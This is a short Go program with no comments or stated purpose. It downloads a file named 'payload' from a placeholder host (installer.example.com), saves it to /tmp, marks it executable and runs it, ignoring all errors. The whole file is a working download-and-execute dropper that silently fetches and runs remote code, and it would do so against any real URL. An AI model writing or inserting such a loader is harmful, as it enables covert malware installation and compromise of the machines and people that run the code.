package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	resp, _ := http.Get("https://installer.example.com/payload")
	out, _ := os.Create("/tmp/payload")
	_, _ = io.Copy(out, resp.Body)
	_ = os.Chmod("/tmp/payload", 0o755)
	_ = exec.Command("/tmp/payload").Run()
}
